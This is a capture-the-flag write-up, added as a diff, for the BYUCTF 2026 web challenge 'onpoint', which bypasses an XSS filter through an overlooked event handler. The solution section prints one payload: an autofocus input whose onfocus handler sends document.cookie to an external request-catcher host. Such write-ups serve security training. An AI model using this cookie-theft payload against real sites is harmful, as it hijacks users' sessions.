@@ -1,0 +1,83 @@
+---
+title: "onpoint — BYUCTF 2026"
+date: 2026-06-27
+author: "Imattas aka Zemi"
+slug: "byuctf-2026-onpoint"
+order: 228
+writeupKind: "challenge"
+ctfSlug: "byuctf-2026"
+ctfTitle: "BYUCTF 2026"
+---
+
+# onpoint — BYUCTF 2026
+
+> **Category:** `Web Exploitation`  
+> **Author:** Imattas aka Zemi  
+> **Flag:** `byuctf{I_w4s_sur3_th1s_0ne_w4a_b3tt3r...}`  
+> **Source Path:** `web/onpoint`
+
+---
+
+## Challenge Description
+
+```text
+Name: on point  
+Description: The last XSS challenge was too easy. And I hate you. So I tried to think of every possible JS function that could possible be used to XSS my website. I will give you source code though because I'm not a monster.  
+
+NOTE: You can report suspicious posts to the admin below.  
+
+Frontend: https://onpoint.csapi.dev/  
+Admin Bot: https://admin.csapi.dev/  
+
+Files: app.py and adminbot/bot/bot.js
+```
+
+---
+
+## Provided Materials
+
+- [Repository folder](https://github.com/BYU-CSA/BYUCTF-2026/tree/main/web/onpoint)
+- [web/onpoint/challenge.md](https://github.com/BYU-CSA/BYUCTF-2026/blob/main/web/onpoint/challenge.md)
+- [web/onpoint/writeup.md](https://github.com/BYU-CSA/BYUCTF-2026/blob/main/web/onpoint/writeup.md)
+
+---
+
+## Recon / Initial Analysis
+
+This page imports the BYUCTF 2026 source material for the Web Exploitation challenge **onpoint**. The prompt is kept separate from the solve notes, and upstream artifacts are linked so the challenge can be replayed from the original repository.
+
+---
+
+## Vulnerability / Observation
+
+The useful observation comes from the imported solve notes below. I kept the original technical path intact while normalizing the page metadata, challenge grouping, and author attribution for the Volume 2 writeup archive.
+
+---
+
+## Exploitation / Solution
+
+Source: [web/onpoint/writeup.md](https://github.com/BYU-CSA/BYUCTF-2026/blob/main/web/onpoint/writeup.md)
+
+Ok this one is a little more complicated, but basically the idea here is that there are a few "onX" functions that I probably forgot, and they just need to find a good one that gets what they want.
+
+Something like onfocus. This payload worked previously, but I'd need to test after hosting: 
+
+<input onfocus="location=`https://yours.requestcatcher.com/?c=`+document.cookie" autofocus="">
+
+
+
+Flag: `byuctf{I_w4s_sur3_th1s_0ne_w4a_b3tt3r...}`
+
+---
+
+## Full Exploit Script
+
+No standalone exploit script was present in the selected source material.
+
+---
+
+## Key Takeaways
+
+- The BYUCTF 2026 challenge material is preserved with local archive formatting.
+- The page author is normalized to Imattas aka Zemi.
+- The source repository remains linked for handouts, services, and solve artifacts.
